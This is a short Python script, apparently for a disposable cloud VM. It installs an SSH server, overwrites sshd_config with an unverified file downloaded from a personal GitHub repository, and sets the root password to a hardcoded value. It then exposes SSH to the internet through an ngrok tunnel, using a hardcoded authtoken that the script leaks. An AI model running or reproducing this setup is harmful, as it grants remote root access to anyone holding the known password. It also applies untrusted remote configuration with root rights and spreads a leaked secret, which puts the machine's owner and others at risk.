from os import system
import subprocess

system("sudo apt update -y && sudo apt upgrade -y")
system("sudo apt install wget -y && sudo apt-get install openssh-server -y")
system("sudo service ssh start")
system("sudo wget -P /root/ https://raw.githubusercontent.com/ivangabriel21/DependeciaDX/main/sshd_config")
system("sudo rm -rf /etc/ssh/sshd_config")
system("sudo mv /root/sshd_config /etc/ssh/")
system("sudo service ssh restart")
new_password = "ivangabriel"
change_password_cmd = f"echo 'root:{new_password}' | sudo chpasswd"
subprocess.run(change_password_cmd, shell=True)
system("sudo wget -P /root https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz")
system("sudo tar -xzvf /root/ngrok-v3-stable-linux-amd64.tgz")
system("sudo /root/./ngrok config add-authtoken 2VaL3LAsgw2R7Hl46qj2TbJ5fCr_2NsVnR9cxV9SQRk6dm6hR")
system("sudo /root/./ngrok tcp 2223")
